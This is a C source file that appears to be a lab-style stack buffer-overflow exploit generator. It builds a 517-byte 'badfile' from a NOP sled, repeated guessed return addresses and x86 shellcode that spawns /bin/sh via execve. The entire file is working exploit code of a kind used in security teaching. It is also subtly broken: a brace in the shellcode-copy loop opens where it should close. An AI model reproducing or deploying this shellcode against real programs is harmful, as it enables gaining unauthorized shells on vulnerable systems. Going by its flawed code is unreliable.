#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define DEFAULT_OFFSET 350 

char shellcode[]=
"\x31\xc0"              /* xorl    %eax,%eax              */
"\x50"                  /* pushl   %eax                   */
"\x68""//sh"            /* pushl   $0x68732f2f            */
"\x68""/bin"            /* pushl   $0x6e69622f            */
"\x89\xe3"              /* movl    %esp,%ebx              */
"\x50"                  /* pushl   %eax                   */
"\x53"                  /* pushl   %ebx                   */
"\x89\xe1"              /* movl    %esp,%ecx              */
"\x99"                  /* cdql                           */
"\xb0\x0b"              /* movb    $0x0b,%al              */    
"\xcd\x80"              /* int     $0x80                  */

unsigned long get_sp(void)
{
    __asm__("movl %esp,%eax");
}

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;
    char *ptr;
    long *a_ptr,ret;

    int offset = DEFAULT_OFFSET;
    int codeSize = sizeof(shellcode);
    int buffSize = sizeof(buffer);

    if(argc > 1) offset = atoi(argv[1]); //allows for command line input

    ptr=buffer;
    a_ptr = (long *) ptr;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(buffer, 0x90, buffSize);

    ret = get_sp()+offset;
    printf("Return Address: 0x%x\n",get_sp());
    printf("Address: 0x%x\n",ret);

    ptr = buffer;
    a_ptr = (long *) ptr;

    int i;
    for (i = 0; i < 300;i+=4)
    {
        *(a_ptr++) = ret;
    }

    for(i = 486;i < codeSize + 486;++i)
    {
        buffer[i] = shellcode[i-486];
    {
    buffer[buffSize - 1] = '\0';    

/* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer,517,1,badfile);
    fclose(badfile);    
}